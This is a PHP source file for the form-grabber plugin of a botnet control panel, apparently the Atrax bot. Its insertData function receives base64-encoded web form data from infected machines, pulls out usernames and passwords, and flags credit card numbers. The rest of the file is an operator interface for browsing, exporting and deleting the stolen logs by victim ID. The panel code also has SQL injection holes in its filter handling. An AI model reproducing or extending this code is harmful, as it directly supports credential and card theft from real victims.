<?php

class main
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    /*
     * Run plugin
     */
    public function run()
    {
        if( !empty( $_POST['glogs_filter'] )) {
            $_SESSION['glogs_filter'] = $_POST['glogs_filter'];
        }

        if( isset( $_POST['glogs_filter_submit']) && empty( $_POST['glogs_filter'] ))
            unset( $_SESSION['glogs_filter'] );

        if( !empty( $_POST['glogs_select'] )) {
            $_SESSION['glogs_select'] = $_POST['glogs_select'];
        }

        if( isset( $_POST['glogs_filter_submit'] ) && empty( $_POST['glogs_select'] ))
            unset( $_SESSION['glogs_select'] );

        if( isset( $_POST['glogs_filter_reset'] )) {
            unset( $_SESSION['glogs_filter'] );
            unset( $_SESSION['glogs_select'] );
        } 

        if( !empty( $_SESSION['glogs_filter'] ) || !empty( $_SESSION['glogs_select'] ))
        {
            if( !empty( $_SESSION['glogs_filter'] )) {
				//die ($_SESSION['glogs_filter']);
				if (stristr($_SESSION['glogs_filter'], 'GUID = UNHEX(') != FALSE)
				{
					$filter = 'WHERE ' . $_SESSION['glogs_filter'];
				}
				else
				{
				$filter = $this->parseFilter( $_SESSION['glogs_filter'] );
				}
                
				//die ($filter);
				}
            if( !empty( $_SESSION['glogs_select'] )) {
                if( !isset( $filter ) || trim($filter) == "WHERE" )
                    $filter = "WHERE `typeId` = '".$_SESSION['glogs_select']."'";
                else
                    $filter .= " AND `typeId` = '".$_SESSION['glogs_select']."'";
            }
            if( trim($filter) == "WHERE" )
                unset( $filter );
				
			
        }

        if (isset($_POST['logs_export_all'])) {
            $this->MySQL->doQuery('SELECT GUID, HEX(GUID) as GUIDString,typename,host,username,password,creditcard,creationDate,data,HEX(hash) as hashString,typeId,typename FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` '.(isset($filter) ? $filter : '').'');

            if ($this->MySQL->numResult()) {
                $today = date("Ymd");
                header('Content-Type: text/plain');
                header('Content-Disposition: Attachment; filename=atrax_formgrabber_logs_' . $today . '.txt');
                header('Pragma: no-cache');

                $i = 0;
                while ($pwgrabber = $this->MySQL->arrayResult()) {
					echo 'HWID:' . "\t\t" . $pwgrabber['GUID'] . "\r\n";
                    echo 'Type:' . "\t\t" . $pwgrabber['typename'] . "\r\n";
                    echo 'Host:' . "\t\t" . $pwgrabber['host'] . "\r\n";
                    echo 'Data:' . "\t\t" . $pwgrabber['data'] . "\r\n";
                    echo 'Created:' . "\t" . $pwgrabber['creationDate'] . "\r\n";
                    echo '=====================================' . "\r\n\r\n";

                    $i++;
                }

                die('');
            }
        }

        if (isset($_POST['logs_delete_all'])) {
            $this->MySQL->doQuery('DELETE FROM `plugin_' . $this->PluginName . '`');
        }

        if( isset( $_POST['log_id'] )) {
            $this->MySQL->doQuery("DELETE FROM `plugin_" . $this->PluginName . "` WHERE ID = '".(int) $_POST['log_id']."'");
        }

        
        if( isset( $_GET['detail'] ))
        {
            $this->MySQL->doQuery("SELECT GUID, HEX(GUID) as GUIDString,typename,host,username,password,creditcard,creationDate,data,HEX(hash) as hashString FROM `plugin_" . $this->PluginName . "` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` WHERE `ID` = '".(int) $_GET['detail']."' LIMIT 1");
            $detail = $this->MySQL->arrayResult();

            $menu = '<div class="stealer_menu">';           
            $menu .= '<span class="buttons" style="float:right;">';
            $menu .= '<a href="'.preg_replace('/&detail=[0-9]*/', '', $_SERVER['REQUEST_URI']).'"><button class="btnnormal">Back to Overview</button></a>';
            $menu .= '</span>';
            $menu .= '</div>';
            $menu .= '<div style="clear: both;"></div>';

            $code = $menu;

            $code .= '<table id="tablecss" style="width: 52%; float: left;"><tr><th colspan="2">Details</th></tr>';
            $code .= '<tr><td style="min-width: 140px;"><b>Hardware ID (GUID):</b></td><td><a href="?action=bots&view='.$detail['GUIDString'].'"><img src="./images/other/monitor.png" /> '.$detail['GUIDString'].'</a></td></tr>';
            $code .= '<tr><td><b>Type:</b></td><td><img src="./images/types/'.strtolower(str_replace(' ', '_', $detail['typename'])).'.png" /> '.$detail['typename'].'</td></tr>';
            $code .= '<tr><td style="vertical-align: top;"><b>Host:</b></td><td>'.$detail['host'].'</td></tr>';
            $code .= '<tr><td><b>Username:</b></td><td>'.$detail['username'].'</td></tr>';
            $code .= '<tr><td><b>Password:</b></td><td>'.$detail['password'].'</td></tr>';
            $code .= '<tr><td><b>Creditcard:</b></td><td>'.($detail['creditcard'] ? 'Yes' : 'No').'</td></tr>';
            $code .= '<tr><td><b>Hash:</b></td><td>'.$detail['hashString'].'</td></tr>';
            $code .= '<tr><td><b>Creation Date:</b></td><td>'.$detail['creationDate'].'</td></tr>';
            $code .= '<tr><td colspan="2">&nbsp;</td></tr>';
            $code .= '</table>';

            $code .= '<table id="tablecss" style="width: 45%; float: right;"><tr><th>Data</th></tr>';
            $code .= '<tr><td><textarea style="height: 210px; width: 99%" style="border: 1px solid darkgray;" onClick="this.select();" readonly>'.$detail['data'].'</textarea></td></tr>';
            $code .= '</table>';
        }
        else
        {
            $this->MySQL->doQuery('SELECT GUID, HEX(GUID) as GUIDString,typename,host,username,password,creditcard,creationDate,data,HEX(hash) as hashString,typeId,typename FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` GROUP BY `typeId`');
            $options = '<option value="0"><i>Please select...</i></option>';
            while( $t = $this->MySQL->arrayResult() ) {
                $saved = isset($_SESSION['glogs_select']) ? $_SESSION['glogs_select'] : 0;
                $selected = ( $t['typeId'] == $saved ) ? ' selected' : '';
                $options .= '<option value="'.$t['typeId'].'"'.$selected.'>'.$t['typename'].'</option>';
            }

            $menu = '<form name="frmgrabberMenu" method="POST" action="">';
            $menu .= '<div class="stealer_menu">';
            $menu .= '<span class="buttons" style="float: left; width: 75%;">';
            $menu .= '<select name="glogs_select" style="width: 20%; margin-right: 10px; padding: 5px;">'.$options.'</select>';
            $menu .= '<input type="text" name="glogs_filter" style="width: 50%; padding: 6px; margin-right: 10px;" value="'.(isset($_SESSION['glogs_filter']) ? $_SESSION['glogs_filter'] : '').'" />';
            $menu .= '<input class="btnyellow" type="submit" name="glogs_filter_submit" value="Filter Logs" />  ';
            $menu .= '<input class="btnyellow" type="submit" name="glogs_filter_reset" value="Reset Filter" />';
            $menu .= '</span>';
            $menu .= '<span class="buttons" style="float:right;">';
            $menu .= '<input class="btnred" type="submit" name="logs_delete_all" value="Delete All Logs" onclick="return confirm(\'Are you sure you want to delete all grabber logs?\');" />  ';
            $menu .= '<input class="btngreen" type="submit" name="logs_export_all" value="Export All Logs" />';
            $menu .= '</span>';
            $menu .= '</div>';
            $menu .= '</form>';
            $code = $menu . '<table id="tablecss"><tr><th>Type</th><th>Hostname</th><th>Username</th><th>Password</th><th>Possible CC?</th><th>Creation Date</th><th >Action</th></tr>';

            $page = (isset($_GET['page']) && $_GET['page'] > 0) ? ((int) $_GET['page']) : 1;
            $this->MySQL->doQuery('SELECT ID, HEX(GUID) as GUIDString,typename,host,username,password,creditcard,creationDate,data,HEX(hash) as hashString FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` '.(isset($filter) ? $filter : '').' LIMIT '.($page-1)*PERPAGE.','.PERPAGE);
            $i = 0;
            while ($pwgrabber = $this->MySQL->arrayResult()) {
                foreach ($pwgrabber as $key => $value) {
                    $task[$key] = htmlentities($pwgrabber[$key]);
                }

                $pwgrabber['host'] = preg_replace('!^http[s]{0,1}://!', '', $pwgrabber['host'] );
                $tmp = explode( '/', $pwgrabber['host'] );
                $pwgrabber['host'] = $tmp[0];    

                $class = ($i % 2) ? 'alt' : '';
                $code .= '<tr class="' . $class . '"><td><img src="./images/types/'.strtolower(str_replace(' ', '_', $pwgrabber['typename'])).'.png" /> ' . $pwgrabber['typename'] . '</td><td>' . $pwgrabber['host'] . '</td><td>' . $pwgrabber['username'] . '</td><td>' . $pwgrabber['password'] . '</td>';

                if ($pwgrabber['creditcard'] == 1) {
                //if (preg_match(CC_REGEX, $pwgrabber['data'])) {
                    $code .= '<td>YES</td>';
                } else {
                    $code .= '<td>NO</td>';
                }

                $code .= '<td>' . $pwgrabber['creationDate'] . '</td>';

                $code .= '<td><a href="?action=bots&view='.$pwgrabber['GUIDString'].'"><img src="./images/other/monitor.png" title="View Victim" /></a> <a href="'.$_SERVER['REQUEST_URI'].'&detail='.$pwgrabber['ID'].'"><img src="./images/other/page.png" title="Show Details" /></a> <form action="" method="post" style="display: inline;"><input type="hidden" name="log_id" value="'.$pwgrabber['ID'].'" /> <input type="image" src="./images/other/del.png" name="log_delete" title="Delete" onclick="return confirm(\'Are you sure you want to delete this formgrabber log?\');" /></form></td>';
                $code .= '</tr>';
                $i++;
            }

            $code .= '</table>';


            $this->MySQL->doQuery('SELECT id FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` '.(isset($filter) ? $filter : '').'');
            $pages = ceil($this->MySQL->numResult()/PERPAGE);
            $links = array();
            $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page=1">&laquo;</a> ';
            $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page > 1 ? ($page-1) : 1).'"><</a> ';
            for($i=PREVPAGE;$i>=1;$i--)
                if( ($page - $i) > 0 )
                    $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page-$i).'">'.($page-$i).'</a> ';
            $links[] = '<b>'.$page.'</b> ';
            for($i=1;$i<=PREVPAGE;$i++)
                if( ($page + $i) <= $pages )
                    $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page+$i).'">'.($page+$i).'</a> ';
            $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.($page < $pages ? ($page+1) : $pages).'">></a> ';
            $links[] = '<a href="'.preg_replace('/&page=[0-9]*/', '', $_SERVER['REQUEST_URI']).'&page='.$pages.'">&raquo;</a>';

            $code .= '<div style="width: 100%; text-align: center; margin-top: 10px;">';
            foreach( $links as $l=>$v )
                $code .= $v;
            $code .= '</div>';
        }
        

        return $code;
    }

    /*
     * Insert data
     */

    public function insertData()
    {
        define('FROMGRABBER_HOST_PARAM', 'bq');
        define('FROMGRABBER_TYPE_PARAM', 'bw');
        define('FROMGRABBER_DATA_PARAM', 'bz');
        define('FROMGRABBER_HASH_PARAM', 'bx');
        define('CC_REGEX', '/\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})\b/');

        $usernameStrings = array("nutzername=", "userid=", "email=", "_usr=", "username=", "loginName=", "user=", "username%5D=", "logonId=", "email_address=", "appleId=", "login=", "account=");
        $passwordStrings = array("kennwort=", "passwort=", "password=", "Passwd=", "_pwd", "pass=", "password%5D=", "pin=");

        if (isset($_POST[FROMGRABBER_HOST_PARAM]) == TRUE and isset($_POST[FROMGRABBER_DATA_PARAM]) == TRUE and isset($_POST[FROMGRABBER_TYPE_PARAM]) == TRUE and isset($_POST[FROMGRABBER_HASH_PARAM]) == TRUE) {
            //Get post data
            $data = array('guid' => $_POST[POST_PARAM_GUID], 'host' => $_POST[FROMGRABBER_HOST_PARAM], 'data' => $_POST[FROMGRABBER_DATA_PARAM], 'fkGrabTypeId' => $_POST[FROMGRABBER_TYPE_PARAM], 'hash' => $_POST[FROMGRABBER_HASH_PARAM]);

            //Security
            foreach ($data as $key => $value) {
                $data[$key] = $this->MySQL->escapeString($data[$key]);
            }

            $paramHostDecoded = $this->MySQL->escapeString(base64_decode($data['host']));
            $paramDataDecoded = $this->MySQL->escapeString(base64_decode($data['data']));

            $username = 'U';
            $password = 'U';
            $creditcard = 0;
            foreach($usernameStrings as $testUser)
            {
                $result = stristr($paramDataDecoded, $testUser);
                if ($result != FALSE) {
                    $username = substr($result, strlen($testUser));

                    $pos = strpos($username, "&");
                    if ($pos != FALSE) {
                        $username = substr($username, 0, $pos);
                    }
                }
            }
            foreach($passwordStrings as $testPass)
            {
                $result = stristr($paramDataDecoded, $testPass);
                if ($result != FALSE) {
                    $password = substr($result, strlen($testPass));

                    $pos = strpos($password, "&");
                    if ($pos != FALSE) {
                        $password = substr($password, 0, $pos);
                    }
                }
            }
            if (preg_match(CC_REGEX, $paramDataDecoded)) {
                $creditcard = 1;
            }

            $this->MySQL->doQuery('INSERT IGNORE INTO `plugin_' . $this->PluginName . '` (`GUID`, `fkGrabTypeId`, `host`, `data`, `username`, `password`, `creditcard`, `hash`, `creationDate`) VALUES (UNHEX(\'' . $data['guid'] . '\'), \'' . intval($data['fkGrabTypeId']) . '\', \'' . $paramHostDecoded . '\', \'' . $paramDataDecoded . '\', \'' . $username . '\', \'' . $password . '\', \'' . $creditcard . '\', UNHEX(\'' . $data['hash'] . '\'), NOW())');

        }
    }

    /*
     * parse Filter
     */

    public function parseFilter( $string )
    {
        ## String to lower
        $string = strtolower( $string );

        ## Replace special fields
        $string = preg_replace("/type\=|browser\=/", "typename=", $string);
        $string = preg_replace("/hostname\=/", "host=", $string);
        $string = preg_replace("/guid\=/", "GUID=", $string);
		$string = preg_replace("/guidstring\=/", "GUIDString=", $string);
        $string = preg_replace("/id\=/", "ID=", $string);

        ## Split Filter String
        $parts = preg_split("/\&|\||\=/", $string);

        ## Add active pattern between each split
        $c = 0;
        $w = array();
        foreach( $parts as $p )
        {
            $c += strlen($p);
            $w[] = $p;
            if( strlen($string) > $c )
                $w[] = $string{$c};
            $c++;
        }
        
        ## Get possible field names
        $this->MySQL->doQuery('SELECT HEX(GUID) as GUIDString,typename,host,username,password,creditcard,creationDate,data,HEX(hash) as hashString,typeId,typename FROM `plugin_' . $this->PluginName . '` INNER JOIN `plugin_formgrabber_type` ON `typeId` = `fkGrabTypeId` LIMIT 1');
        $data = $this->MySQL->arrayResult();
		
        ## Create Query String
        $lastfield = NULL;
        $query = "WHERE ";
        for($i=0;$i<count($w);$i++)
        {
            if( count($w) < 3 )
                break;
            if( $w[$i] == "=" )
                continue;
            if( isset( $w[$i+1]) && $w[$i+1] == "=" ) {
                if( array_key_exists($w[$i], $data)) {
                    $query .= "( `".$w[$i]."` LIKE ";
                    $lastfield = $w[$i];
                }
                else {
                    if( trim($query) != "WHERE" )
                    {
                        $x = 1;
                        while( substr($query, -$x, 1) != "'")
                            $x++;
                        $query = substr( $query, 0, (strlen($query)-($x-3)) );
						
                        if( isset( $w[$i+3] )) {
                            while( $w[$i+3] != "=" ) {
                                if( isset( $w[$i+4] ))
                                    $i++;
                                else {
                                    $i = count($w);
                                    break;
                                }
                            }
                        }
                        else
                            $i = count($w);
                    }
                    else
                        $i = count($w);
                }
            }
            elseif( $w[$i] == "&" )
                $query .= "AND ";
            elseif( $w[$i] == "|" )
                $query .= "OR ";
            elseif( isset($w[$i-1]) && $w[$i-1] != "=" ) {
                if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                    $query .= "`".$lastfield."` LIKE '%".trim(htmlentities($w[$i]))."%') ";
                else
                    $query .= "`".$lastfield."` LIKE '%".trim(htmlentities($w[$i]))."%' ";
            }
            else {
                if( (isset($w[$i+3]) && $w[$i+3] == "=") || !isset($w[$i+1]) )
                    $query .= "'%".trim(htmlentities($w[$i]))."%') ";
                else
                    $query .= "'%".trim(htmlentities($w[$i]))."%' ";
            }
        }

        return $query;
    }
}